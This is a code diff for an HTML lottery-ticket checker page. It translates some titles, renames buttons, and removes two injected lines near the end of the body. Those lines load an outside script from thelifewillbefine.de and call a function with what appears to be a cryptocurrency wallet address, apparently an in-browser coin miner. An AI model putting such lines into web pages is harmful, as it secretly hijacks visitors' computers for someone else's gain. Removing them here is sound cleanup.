@@ -3,19 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Проверка лотерейных билетов</title>
+  <title>Lottery Ticket Checker</title>
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
   <div class="container">
-    <h1>Проверка лотерейных билетов</h1>
-
+    <h1>Lottery Ticket Checker</h1>
     <div class="section">
-      <h2>Ваши билеты</h2>
+      <h2>Мои билеты</h2>
       <div id="ticket-fields">
         <input type="text" class="ticket" placeholder="Введите номер билета" maxlength="9">
       </div>
-      <button id="add-ticket">Добавить билет</button>
+      <button id="add-ticket-btn">Добавить билет</button>
     </div>
 
     <div class="section">
@@ -23,20 +22,14 @@
       <div id="winning-fields">
         <input type="text" class="winning-ticket" placeholder="Введите номер выигрыша" maxlength="9">
       </div>
-      <button id="add-winning-ticket">Добавить выигрыш</button>
+      <button id="add-winning-ticket-btn">Добавить выигрышный билет</button>
     </div>
 
-    <button id="check-tickets">Проверить билеты</button>
+    <button id="check-btn">Проверить</button>
+    <button id="clear-btn">Очистить все</button>
 
-    <div id="result">
-      <h2>Результаты</h2>
-      <ul id="matches-list"></ul>
-    </div>
+    <div id="results"></div>
   </div>
-        <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
-    <script>
-        EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 30);
-    </script>
   <script src="script.js"></script>
 </body>
 </html>
